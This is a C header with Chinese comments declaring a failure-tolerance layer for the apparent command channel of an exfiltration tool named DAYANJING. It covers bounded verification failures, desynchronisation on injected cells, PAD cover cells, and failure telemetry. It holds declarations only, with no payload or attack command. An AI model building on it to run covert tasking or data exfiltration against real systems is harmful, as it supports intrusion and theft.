/*
 * exfil_tol.h —— 任务通道的"验签失败容忍"层
 * ============================================================
 * 为什么需要它
 * ------------------------------------------------------------
 * 信元的 IV = pfx || counter 是**位置相关**的。修复 p2p_cell_unpack
 * 之后（验签失败也推进 recv_counter），链路上一次"就地篡改"只损失那
 * 一个信元，下一个立刻恢复。
 *
 * 但攻击者若**注入**一个完整信元（不是改，是多塞一个），流就整体偏移
 * 一格：本端位置永远比对端多 1，此后每个信元的 IV 都对不上 —— 不可
 * 恢复的永久失步。此时若不设边界，循环会静默地一直吃信元、一直失败、
 * 永远不投递命令，变成一个**黑洞**：看起来链路还在，实际已废。
 *
 * 黑洞比断链危险得多 —— 断链上层会重建会话，黑洞不会。
 *
 * 本层做两件事
 *   1. 边界：连续失败超过 max_consec 即判定"失步"，返回 FATAL，
 *      让调用方干净断链、上层重建会话。
 *   2. 遥测：累计失败数暴露给调用方 —— "有人在动我的链路"本身就是
 *      一条高价值情报。
 *
 * 一个关键判断
 * ------------------------------------------------------------
 * **能通过验签的 PAD 信元证明流是对齐的**（PAD 的 IV 同样由位置构造）。
 * 所以 PAD 会清零连续失败计数 —— 它是对齐的正证据，不是"什么都没发生"。
 */
#ifndef DAYANJING_EXFIL_TOL_H
#define DAYANJING_EXFIL_TOL_H

#include "exfil_task_link.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 新增返回码（避开 EXF_TASK_* 的 -1..-9 与正值的 EXF_TASK_PAD） */
#define EXF_TOL_OK      0    /* 收到一条有效命令/回执 */
#define EXF_TOL_PAD     1    /* 覆盖信元（与 EXF_TASK_PAD 同义，对齐证据） */
#define EXF_TOL_SKIP    2    /* 本信元验签失败，但在容忍额度内 —— 继续读 */
#define EXF_TOL_FATAL  -20   /* 连续失败超上限：判定失步/被注入，应断链重建 */
#define EXF_TOL_ARG    -21
#define EXF_TOL_IO     -22
#define EXF_TOL_CLOSED -23
#define EXF_TOL_REPLAY -24
#define EXF_TOL_FMT    -25

typedef struct {
    uint32_t max_consec;   /* 容忍的连续失败上限。0 表示不容忍（任何失败即 FATAL） */
    uint32_t consec;       /* 当前连续失败数 */
    uint64_t n_fail;       /* 累计验签失败（遥测：有人在动链路？） */
    uint64_t n_ok;         /* 累计成功投递 */
    uint64_t n_pad;        /* 累计覆盖信元 */
} exfil_tol_t;

/* max_consec 为 0 时取内置默认值（EXF_TOL_DEFAULT_CONSEC）。 */
int  exfil_tol_init(exfil_tol_t *t, uint32_t max_consec);
void exfil_tol_reset_stats(exfil_tol_t *t);
const char *exfil_tol_errstr(int e);

/* 带容忍地读一条命令。语义见上。 */
int exfil_tol_recv_cmd(exfil_tol_t *t, exfil_task_chan_t *ch, int fd,
                       uint64_t *seq, exfil_task_cmd_t *c);

/* 带容忍地读一条回执。 */
int exfil_tol_recv_ack(exfil_tol_t *t, exfil_task_chan_t *ch, int fd,
                       uint64_t *seq, exfil_task_ack_t *a);

#ifdef __cplusplus
}
#endif
#endif
